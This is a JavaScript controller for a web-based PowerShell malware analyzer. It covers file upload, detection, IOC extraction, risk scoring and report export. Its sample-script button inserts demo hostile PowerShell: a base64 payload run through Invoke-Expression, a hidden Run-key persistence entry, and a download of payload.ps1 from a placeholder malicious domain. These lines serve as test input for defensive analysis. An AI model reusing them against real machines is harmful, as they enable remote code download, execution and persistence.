/**
 * Analyzer Page Controller
 */
document.addEventListener('DOMContentLoaded', () => {
    const codeInput = document.getElementById('code-input');
    const fileInput = document.getElementById('file-input');
    const dropZone = document.getElementById('drop-zone');
    const fileInfo = document.getElementById('file-info');
    const analyzeBtn = document.getElementById('analyze-btn');
    const clearBtn = document.getElementById('clear-btn');
    const sampleBtn = document.getElementById('sample-btn');
    const resultsContainer = document.getElementById('results-container');
    const emptyState = document.getElementById('empty-state');

    let currentCode = '';
    let currentFilename = 'Pasted Code';

    // Drag and Drop
    dropZone.addEventListener('dragover', (e) => {
        e.preventDefault();
        dropZone.classList.add('dragover');
    });
    dropZone.addEventListener('dragleave', () => dropZone.classList.remove('dragover'));
    dropZone.addEventListener('drop', (e) => {
        e.preventDefault();
        dropZone.classList.remove('dragover');
        handleFile(e.dataTransfer.files[0]);
    });
    fileInput.addEventListener('change', (e) => handleFile(e.target.files[0]));

    function handleFile(file) {
        if (!file) return;
        if (file.size > 10 * 1024 * 1024) {
            alert('File exceeds 10 MB limit.');
            return;
        }
        const validTypes = ['.ps1', '.psm1', '.psd1', '.txt'];
        const ext = '.' + file.name.split('.').pop().toLowerCase();
        if (!validTypes.includes(ext)) {
            alert('Invalid file type. Allowed: .ps1, .psm1, .psd1, .txt');
            return;
        }

        currentFilename = file.name;
        const reader = new FileReader();
        reader.onload = (e) => {
            currentCode = e.target.result;
            codeInput.value = currentCode;
            fileInfo.textContent = `${file.name} (${(file.size / 1024).toFixed(2)} KB)`;
            fileInfo.classList.remove('d-none');
        };
        reader.readAsText(file);
    }

    analyzeBtn.addEventListener('click', () => {
        currentCode = codeInput.value;
        if (!currentCode.trim()) {
            alert('Please enter or upload PowerShell code.');
            return;
        }

        // Show loading state (simplified)
        analyzeBtn.disabled = true;
        analyzeBtn.innerHTML = '<span class="spinner-border spinner-border-sm"></span> Analyzing...';

        // Use setTimeout to allow UI to update before heavy processing
        setTimeout(() => {
            performAnalysis();
            analyzeBtn.disabled = false;
            analyzeBtn.innerHTML = '<i class="bi bi-play-fill"></i> Analyze';
        }, 100);
    });

    function performAnalysis() {
        const findings = DetectorEngine.analyze(currentCode);
        const iocs = IOCEngine.extract(currentCode);
        const obfData = ObfuscationEngine.analyze(currentCode);
        const riskData = RiskEngine.calculate(findings, obfData.score);
        const summary = RiskEngine.generateSummary(riskData, findings);

        // Save to history
        Storage.saveScan({
            id: Utils.generateId(),
            filename: currentFilename,
            riskScore: riskData.riskScore,
            severity: riskData.severity,
            findings: findings
        });

        // Update UI
        renderResults({ findings, iocs, obfData, riskData, summary, code: currentCode, filename: currentFilename });
        emptyState.classList.add('d-none');
        resultsContainer.classList.remove('d-none');
    }

    clearBtn.addEventListener('click', () => {
        codeInput.value = '';
        currentCode = '';
        currentFilename = 'Pasted Code';
        fileInfo.classList.add('d-none');
        resultsContainer.classList.add('d-none');
        emptyState.classList.remove('d-none');
    });

    sampleBtn.addEventListener('click', () => {
        codeInput.value = `# Sample Suspicious Script
$encoded = 'JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0AA=='
$decoded = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))
Invoke-Expression $decoded

# Persistence
Set-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "Update" -Value "powershell.exe -WindowStyle Hidden -e JABjAGwAaQBlAG4AdAA..."

# Network
Invoke-WebRequest -Uri "http://malicious-domain.ru/payload.ps1" -OutFile "$env:TEMP\\payload.ps1"
`;
        currentFilename = 'sample_suspicious.ps1';
    });

    // Export handlers
    document.getElementById('export-html').addEventListener('click', () => {
        const data = gatherCurrentData();
        Utils.downloadFile(ReportEngine.generateHTML(data), `PSA_Report_${Date.now()}.html`, 'text/html');
    });
    document.getElementById('export-json').addEventListener('click', () => {
        const data = gatherCurrentData();
        Utils.downloadFile(ReportEngine.generateJSON(data), `PSA_Report_${Date.now()}.json`, 'application/json');
    });
    document.getElementById('export-csv').addEventListener('click', () => {
        const data = gatherCurrentData();
        Utils.downloadFile(ReportEngine.generateCSV(data.findings), `PSA_Findings_${Date.now()}.csv`, 'text/csv');
    });

    function gatherCurrentData() {
        // Simplified retrieval; in production, store analysis state in a module
        return window.currentAnalysisData || {};
    }

    // Expose render function to window for export access
    window.renderResults = (data) => {
        window.currentAnalysisData = data;
        
        // Update Preview
        document.getElementById('preview-obfuscation').textContent = `${data.obfData.score}/100`;
        document.getElementById('preview-obfuscation-bar').style.width = `${data.obfData.score}%`;
        document.getElementById('preview-risk').textContent = `${data.riskData.riskScore} (${data.riskData.severity})`;

        // Update Summary
        document.getElementById('res-risk-score').textContent = data.riskData.riskScore;
        document.getElementById('res-mal-score').textContent = `${data.riskData.maliciousScore}%`;
        document.getElementById('res-confidence').textContent = data.riskData.confidence;
        document.getElementById('summary-text').textContent = data.summary;

        // Render Findings Table
        const findingsBody = document.querySelector('#findings-table tbody');
        findingsBody.innerHTML = data.findings.map(f => `
            <tr>
                <td class="severity-${f.severity.toLowerCase()}">${f.severity}</td>
                <td>${f.category}</td>
                <td>${f.description} <br><small class="text-muted">Rec: ${f.recommendation}</small></td>
                <td><a href="#" onclick="jumpToLine(${f.line})" class="text-info">${f.line}</a></td>
            </tr>
        `).join('');

        // Render MITRE Table
        const mitreBody = document.querySelector('#mitre-table tbody');
        const mitreMap = {};
        data.findings.forEach(f => {
            if (f.mitre) f.mitre.forEach(m => {
                if (!mitreMap[m]) mitreMap[m] = new Set();
                mitreMap[m].add(f.name);
            });
        });
        mitreBody.innerHTML = Object.entries(mitreMap).map(([id, names]) => `
            <tr>
                <td><span class="badge bg-secondary">${id}</span></td>
                <td>Execution/Defense Evasion</td>
                <td>${Array.from(names).join(', ')}</td>
            </tr>
        `).join('');

        // Render IOC Table
        const iocBody = document.querySelector('#ioc-table tbody');
        iocBody.innerHTML = data.iocs.map(i => `
            <tr>
                <td><span class="badge bg-info text-dark">${i.type}</span></td>
                <td class="font-monospace small">${Utils.escapeHTML(i.value)}</td>
                <td>${i.line}</td>
                <td><button class="btn btn-sm btn-outline-secondary" onclick="navigator.clipboard.writeText('${Utils.escapeHTML(i.value)}')">Copy</button></td>
            </tr>
        `).join('');

        // Render Source Code with Line Numbers and Highlighting
        const codeViewer = document.getElementById('source-code-viewer');
        const lines = data.code.split('\n');
        const findingLines = new Set(data.findings.map(f => f.line));
        
        codeViewer.innerHTML = lines.map((line, idx) => {
            const lineNum = idx + 1;
            const isFinding = findingLines.has(lineNum);
            const className = isFinding ? 'highlight-line' : '';
            return `<span class="${className}"><span class="line-number">${lineNum}</span>${Utils.escapeHTML(line)}</span>`;
        }).join('\n');
    };

    window.jumpToLine = (lineNum) => {
        document.querySelector('#inputTab button[data-bs-target="#paste-pane"]').click();
        const lines = codeInput.value.split('\n');
        // Simple visual cue in textarea (select the line)
        let start = 0;
        for (let i = 0; i < lineNum - 1; i++) {
            start += lines[i].length + 1;
        }
        codeInput.focus();
        codeInput.setSelectionRange(start, start + lines[lineNum - 1].length);
    };

    document.getElementById('toggle-wrap').addEventListener('click', () => {
        const viewer = document.getElementById('source-code-viewer');
        viewer.style.whiteSpace = viewer.style.whiteSpace === 'pre-wrap' ? 'pre' : 'pre-wrap';
    });

    document.getElementById('copy-code').addEventListener('click', () => {
        navigator.clipboard.writeText(currentCode);
        alert('Code copied to clipboard.');
    });
});